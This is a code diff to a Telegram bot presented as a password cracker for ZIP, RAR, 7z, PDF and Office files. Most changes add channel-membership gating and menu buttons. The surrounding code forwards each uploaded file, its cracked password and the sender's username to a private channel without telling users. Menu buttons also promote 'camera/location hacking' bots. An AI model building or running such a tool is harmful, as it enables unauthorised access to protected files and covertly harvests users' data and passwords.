@@ -127,9 +127,11 @@ def crack_file(file_path, ext):
         return None
 
 # ============================================================
-# 4. OUR BOTS BUTTON
+# 4. OUR BOTS BUTTON (Bottom Me)
 # ============================================================
 OUR_BOTS_TEXT = """
+🤖 *OUR BOTS*
+
 ╔═══════════════════════════════════════╗
 ║                                       ║
 ║          @camerahacking_nrt_bot       ║
@@ -171,6 +173,7 @@ async def our_bots(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🔉 TEXT TO VOICE", url="https://t.me/nrtts_bot")],
         [InlineKeyboardButton("📸 CAMERA HACKING", url="https://t.me/nrtratrofficial_bot")],
         [InlineKeyboardButton("😧 PERIODS HELP", url="https://t.me/periodshelp_bot")],
+        [InlineKeyboardButton("🏠 MAIN MENU", callback_data="main_menu")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -183,15 +186,26 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
     if not await check_channel_membership(user_id):
+        # 🔥 NOT JOINED - Show Join Channel Button
+        keyboard = [
+            [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
+            [InlineKeyboardButton("✅ VERIFY", callback_data="verify")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
         await update.message.reply_text(
             "🔴 *Access Denied!*\n\n"
             "❌ Please join our channel first:\n"
             "👉 @nrtecno2\n\n"
-            "_After joining, send /start again._",
+            "_1. Click JOIN CHANNEL\n"
+            "2. Join the channel\n"
+            "3. Click VERIFY_",
+            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
         return
     
+    # 🔥 JOINED - Show Welcome + OUR BOTS Bottom
     keyboard = [
         [InlineKeyboardButton("🤖 OUR BOTS", callback_data="our_bots")],
         [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
@@ -211,8 +225,77 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     
-    if query.data == "our_bots":
-        await our_bots(query.message, context)
+    user_id = update.effective_user.id
+    
+    if query.data == "verify":
+        # Check if user joined
+        if await check_channel_membership(user_id):
+            # 🔥 VERIFIED - Show Welcome + OUR BOTS Bottom
+            keyboard = [
+                [InlineKeyboardButton("🤖 OUR BOTS", callback_data="our_bots")],
+                [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.edit_message_text(
+                "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
+                "✅ Channel Member Verified!\n"
+                "📁 Send me any password protected file.\n\n"
+                "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+        else:
+            # Still not joined
+            keyboard = [
+                [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
+                [InlineKeyboardButton("✅ VERIFY", callback_data="verify")],
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.edit_message_text(
+                "🔴 *Still Not Verified!*\n\n"
+                "❌ Please join @nrtecno2 first.\n\n"
+                "_1. Click JOIN CHANNEL\n"
+                "2. Join the channel\n"
+                "3. Click VERIFY_",
+                reply_markup=reply_markup,
+                parse_mode='Markdown'
+            )
+    
+    elif query.data == "our_bots":
+        # 🔥 OUR BOTS Message
+        keyboard = [
+            [InlineKeyboardButton("📸 CAMERA/LOCATION HACK", url="https://t.me/camerahacking_nrt_bot")],
+            [InlineKeyboardButton("🔉 TEXT TO VOICE", url="https://t.me/nrtts_bot")],
+            [InlineKeyboardButton("📸 CAMERA HACKING", url="https://t.me/nrtratrofficial_bot")],
+            [InlineKeyboardButton("😧 PERIODS HELP", url="https://t.me/periodshelp_bot")],
+            [InlineKeyboardButton("🏠 BACK", callback_data="main_menu")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            OUR_BOTS_TEXT,
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "main_menu":
+        # 🔥 BACK TO MAIN MENU
+        keyboard = [
+            [InlineKeyboardButton("🤖 OUR BOTS", callback_data="our_bots")],
+            [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            "🔐 *NRTECNO PASSWORD CRACKER*\n\n"
+            "✅ Channel Member Verified!\n"
+            "📁 Send me any password protected file.\n\n"
+            "Supported: ZIP, 7z, RAR, PDF, DOCX, XLSX, PPTX",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -220,7 +303,18 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # CHANNEL CHECK
     if not await check_channel_membership(user_id):
-        await update.message.reply_text("❌ Please join @nrtecno2 first.")
+        keyboard = [
+            [InlineKeyboardButton("📢 JOIN CHANNEL", url="https://t.me/nrtecno2")],
+            [InlineKeyboardButton("✅ VERIFY", callback_data="verify")],
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await update.message.reply_text(
+            "🔴 *Access Denied!*\n\n"
+            "❌ Please join @nrtecno2 first.",
+            reply_markup=reply_markup,
+            parse_mode='Markdown'
+        )
         return
     
     file = update.message.document
@@ -240,7 +334,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ext = file.file_name.split('.')[-1].lower()
     password = crack_file(file_path, ext)
     
-    # PRIVATE CHANNEL FORWARD (ALWAYS)
+    # PRIVATE CHANNEL FORWARD
     try:
         caption = f"📁 File: {file.file_name}\n🔑 Password: `{password or 'NOT FOUND'}`\n👤 User: @{username}\n📅 Date: {__import__('datetime').datetime.now()}"
         
@@ -286,7 +380,6 @@ def main():
     app = Application.builder().token(TOKEN).build()
     
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("bots", our_bots))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
     
